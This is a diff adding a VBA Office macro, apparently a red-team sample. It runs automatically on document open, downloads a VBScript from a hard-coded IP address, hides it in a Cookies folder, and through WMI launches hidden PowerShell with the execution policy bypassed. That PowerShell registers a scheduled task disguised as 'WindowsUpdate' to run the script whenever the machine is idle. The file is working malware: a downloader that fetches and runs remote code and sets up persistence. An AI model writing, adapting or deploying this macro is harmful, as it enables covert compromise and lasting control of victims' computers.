@@ -1,0 +1,51 @@
+' Author: Matt Nelson
+' Twitter: @enigma0x3
+
+Sub Auto_Open()
+Download
+Persist
+
+End Sub
+     
+     Public Function Download() As Variant
+
+   Dim FileNum As Long
+    Dim FileData() As Byte
+    Dim MyFile As String
+    Dim WHTTP As Object
+
+    On Error Resume Next
+    Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5")
+    If Err.Number <> 0 Then
+        Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5.1")
+    End If
+    On Error GoTo 0
+    
+    MyFile = "http://192.168.3.143/Initialize.vbs"
+    
+    WHTTP.Open "GET", MyFile, False
+    WHTTP.Send
+    FileData = WHTTP.ResponseBody
+    Set WHTTP = Nothing
+    
+    
+    FileNum = FreeFile
+    Open "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\Initialize.vbs" For Binary Access Write As #FileNum
+    Put #FileNum, 1, FileData
+    Close #FileNum
+SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\Initialize.vbs", vbHidden
+            
+    End Function
+     
+     Public Function Persist() As Variant
+        Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+        
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN WindowsUpdate /TR 'C:\Windows\System32\WScript.exe //Nologo //B C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\Initialize.vbs' /SC onidle /i 20}", Null, objConfig, intProcessID
+     End Function
+     
